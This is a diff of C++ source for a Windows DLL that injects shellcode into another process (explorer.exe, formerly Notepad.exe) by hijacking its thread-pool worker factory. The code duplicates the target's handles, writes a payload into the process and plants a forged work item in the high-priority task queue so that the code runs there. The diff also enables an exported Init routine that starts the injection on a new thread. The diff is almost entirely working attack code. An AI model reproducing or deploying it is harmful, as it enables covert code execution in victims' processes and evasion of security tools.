@@ -235,59 +235,16 @@ typedef NTSTATUS(NTAPI* NtQueryInformationWorkerFactory_t)(
 	);
 
 int Run() {
-	// Resolve ntdll and kernel32 functions
 	HMODULE hNtdll = LoadLibraryA("ntdll.dll");
-	HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
-
-	// Typedefs for WinAPI functions
-	typedef HANDLE(WINAPI* OpenProcessPtr)(DWORD, BOOL, DWORD);
-	typedef BOOL(WINAPI* DuplicateHandlePtr)(HANDLE, HANDLE, HANDLE, LPHANDLE, DWORD, BOOL, DWORD);
-	typedef BOOL(WINAPI* ReadProcessMemoryPtr)(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T*);
-	typedef LPVOID(WINAPI* VirtualAllocExPtr)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
-	typedef BOOL(WINAPI* WriteProcessMemoryPtr)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
-	typedef BOOL(WINAPI* CloseHandlePtr)(HANDLE);
-
-	// Resolve function pointers
-	OpenProcessPtr pOpenProcess = (OpenProcessPtr)GetProcAddress(hKernel32, "OpenProcess");
-	DuplicateHandlePtr pDuplicateHandle = (DuplicateHandlePtr)GetProcAddress(hKernel32, "DuplicateHandle");
-	ReadProcessMemoryPtr pReadProcessMemory = (ReadProcessMemoryPtr)GetProcAddress(hKernel32, "ReadProcessMemory");
-	VirtualAllocExPtr pVirtualAllocEx = (VirtualAllocExPtr)GetProcAddress(hKernel32, "VirtualAllocEx");
-	WriteProcessMemoryPtr pWriteProcessMemory = (WriteProcessMemoryPtr)GetProcAddress(hKernel32, "WriteProcessMemory");
-	CloseHandlePtr pCloseHandle = (CloseHandlePtr)GetProcAddress(hKernel32, "CloseHandle");
-
-	// Resolve NT functions
-	NtQueryInformationProcess_t NtQueryInformationProcess = (NtQueryInformationProcess_t)GetProcAddress(hNtdll, "NtQueryInformationProcess");
-	NtQueryObject_t NtQueryObject = (NtQueryObject_t)GetProcAddress(hNtdll, "NtQueryObject");
-	NtQueryInformationWorkerFactory_t NtQueryInformationWorkerFactoryfn = (NtQueryInformationWorkerFactory_t)GetProcAddress(hNtdll, "NtQueryInformationWorkerFactory");
-
-	LPHANDLE pDuplicateHandleVar = new HANDLE;
+	LPHANDLE pDuplicateHandle = new HANDLE;
 	DWORD PID = 0;
-
-	// Use resolved OpenProcess in getProcHandlebyName
-	HANDLE hProc = nullptr;
-	{
-		PROCESSENTRY32W entry;
-		entry.dwSize = sizeof(PROCESSENTRY32W);
-		HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
-		if (snapshot && Process32First(snapshot, &entry)) {
-			do {
-				if (wcscmp((entry.szExeFile), L"Notepad.exe") == 0) {
-					PID = entry.th32ProcessID;
-					hProc = pOpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, PID);
-					if (!hProc) { continue; }
-					break;
-				}
-			} while (Process32Next(snapshot, &entry));
-		}
-	}
-
+	HANDLE hProc = getProcHandlebyName((LPWSTR)L"explorer.exe", &PID);
 	if (!hProc) {
 		DEBUG("[x] Cannot open the process\n");
 		return -1;
 	}
-
 	NTSTATUS ntStatus;
-	std::vector<BYTE> information;
+	vector<BYTE> information;
 	ULONG returnLength = 0;
 	do {
 		information.resize(returnLength);
@@ -299,48 +256,53 @@ int Run() {
 				returnLength,
 				&returnLength
 			);
+		//STATUS_INFO_LENGTH_MISMATCH
 	} while (ntStatus == 0xC0000004);
 
 	PPROCESS_HANDLE_SNAPSHOT_INFORMATION pProcessInformation = reinterpret_cast<PPROCESS_HANDLE_SNAPSHOT_INFORMATION>(information.data());
 
 	for (int i = 0; i < pProcessInformation->NumberOfHandles; i++) {
 		HANDLE tmp = pProcessInformation->Handles[i].HandleValue;
-		if (!pDuplicateHandle(
+		if (!DuplicateHandle(
 			hProc,
 			pProcessInformation->Handles[i].HandleValue,
 			GetCurrentProcess(),
-			pDuplicateHandleVar,
+			pDuplicateHandle,
 			WORKER_FACTORY_ALL_ACCESS,
 			FALSE,
 			NULL
 		)) {
 			DEBUG("DuplicateHandle Failded\n");
+			//return -1;
 			continue;
 		}
 
-		std::vector<BYTE> object;
+
+		vector<BYTE> object;
 		returnLength = 0;
 		do {
 			object.resize(returnLength);
 			ntStatus =
 				NtQueryObject(
-					*pDuplicateHandleVar,
+					*pDuplicateHandle,
 					static_cast<OBJECT_INFORMATION_CLASS>(ObjectTypeInformation),
 					object.data(),
 					returnLength,
 					&returnLength);
 		} while (ntStatus == 0xC0000004);
 		PPUBLIC_OBJECT_TYPE_INFORMATION pObjectInformation = reinterpret_cast<PPUBLIC_OBJECT_TYPE_INFORMATION>(object.data());
-		if (std::wstring(pObjectInformation->TypeName.Buffer) == L"TpWorkerFactory") {
+		if (wstring(pObjectInformation->TypeName.Buffer) == L"TpWorkerFactory") {
 			break;
 		}
 	}
 
-	LPVOID remoteAddress = writeShellMapping(hProc);
+	LPVOID OEP = writeShellMapping(hProc);
+	//LPVOID OEP = WritePEToTarget(hProc, "C:\\Users\\vuong\\source\\repos\\MessageBoxA\\x64\\Release\\MessageBoxA.exe");
 
 	WORKER_FACTORY_BASIC_INFORMATION WorkerFactoryInformation = { 0 };
+	NtQueryInformationWorkerFactoryPtr NtQueryInformationWorkerFactoryfn = (NtQueryInformationWorkerFactoryPtr)GetProcAddress(hNtdll, "NtQueryInformationWorkerFactory");
 	ntStatus = NtQueryInformationWorkerFactoryfn(
-		*pDuplicateHandleVar,
+		*pDuplicateHandle,
 		WorkerFactoryBasicInformation,
 		&WorkerFactoryInformation,
 		sizeof(WorkerFactoryInformation),
@@ -352,31 +314,35 @@ int Run() {
 	}
 
 	SIZE_T byteWritten;
-	std::vector<BYTE> buffer;
+	vector<BYTE> buffer;
 	buffer.resize(sizeof(FULL_TP_POOL));
 	SIZE_T byteRead;
-	pReadProcessMemory(hProc, WorkerFactoryInformation.StartParameter, buffer.data(), sizeof(FULL_TP_POOL), &byteRead);
+	PVOID a = (PVOID)&WorkerFactoryInformation;
+	PVOID kk = &WorkerFactoryInformation.StartParameter;
+	ReadProcessMemory(hProc, WorkerFactoryInformation.StartParameter, buffer.data(), sizeof(FULL_TP_POOL), &byteRead);
 	PFULL_TP_POOL pTargetTpPool = reinterpret_cast<PFULL_TP_POOL>(buffer.data());
 	const auto TargetTaskQueueHighPriorityList = &pTargetTpPool->TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue;
-	const auto pTpWork = (PFULL_TP_WORK)CreateThreadpoolWork(static_cast<PTP_WORK_CALLBACK>(remoteAddress), nullptr, nullptr);
+	const auto pTpWork = (PFULL_TP_WORK)CreateThreadpoolWork(static_cast<PTP_WORK_CALLBACK>(OEP), nullptr, nullptr);
 	pTpWork->CleanupGroupMember.Pool = static_cast<PFULL_TP_POOL>(WorkerFactoryInformation.StartParameter);
 	pTpWork->Task.ListEntry.Flink = TargetTaskQueueHighPriorityList;
 	pTpWork->Task.ListEntry.Blink = TargetTaskQueueHighPriorityList;
 	pTpWork->WorkState.Exchange = 0x2;
 
-	const auto pRemoteTpWork = static_cast<PFULL_TP_WORK>(pVirtualAllocEx(hProc, nullptr, sizeof(FULL_TP_WORK), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
-	pWriteProcessMemory(hProc, pRemoteTpWork, pTpWork, sizeof(FULL_TP_WORK), &byteWritten);
+	const auto pRemoteTpWork = static_cast<PFULL_TP_WORK>(VirtualAllocEx(hProc, nullptr, sizeof(FULL_TP_WORK), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
+	WriteProcessMemory(hProc, pRemoteTpWork, pTpWork, sizeof(FULL_TP_WORK), &byteWritten);
 	auto RemoteWorkItemTaskList = &pRemoteTpWork->Task.ListEntry;
 
-	pWriteProcessMemory(hProc, &pTargetTpPool->TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue.Flink, &RemoteWorkItemTaskList, sizeof(RemoteWorkItemTaskList), &byteWritten);
-	pWriteProcessMemory(hProc, &pTargetTpPool->TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue.Blink, &RemoteWorkItemTaskList, sizeof(RemoteWorkItemTaskList), &byteWritten);
+	WriteProcessMemory(hProc, &pTargetTpPool->TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue.Flink, &RemoteWorkItemTaskList, sizeof(RemoteWorkItemTaskList), &byteWritten);
+	WriteProcessMemory(hProc, &pTargetTpPool->TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue.Blink, &RemoteWorkItemTaskList, sizeof(RemoteWorkItemTaskList), &byteWritten);
 
-	pCloseHandle(hProc);
 
-	DEBUG("[+] Successfully injected the work item into the target process's thread pool\n");
 	return 1;
 }
 
+
+extern "C" __declspec(dllexport) void Func1() {}
+extern "C" __declspec(dllexport) void Func2() {}
+extern "C" __declspec(dllexport) void Func3() {}
 
 extern "C" __declspec(dllexport) int Init() {
 	const char* pipeName = R"(\\.\pipe\MyPipe)";
@@ -395,14 +361,16 @@ extern "C" __declspec(dllexport) int Init() {
 
 	if (hPipe == INVALID_HANDLE_VALUE) {
 		std::cerr << "Failed to create pipe. Error: " << GetLastError() << std::endl;
+		DEBUG("Failed to create pipe.");
 		return 1;
 	}
 
-	/*CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)Run, nullptr, 0, nullptr);*/
+	CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)Run, nullptr, 0, nullptr);
 	
 	//Run();
 
 	std::cout << "Waiting for client to connect..." << std::endl;
+	DEBUG("Waiting for client to connect...");
 	BOOL connected = ConnectNamedPipe(hPipe, nullptr) ? TRUE : (GetLastError() == ERROR_PIPE_CONNECTED);
 
 	if (connected) {
@@ -441,6 +409,7 @@ BOOL APIENTRY DllMain( HMODULE hModule,
     switch (ul_reason_for_call)
     {
     case DLL_PROCESS_ATTACH:
+		break;
     case DLL_THREAD_ATTACH:
     case DLL_THREAD_DETACH:
     case DLL_PROCESS_DETACH:
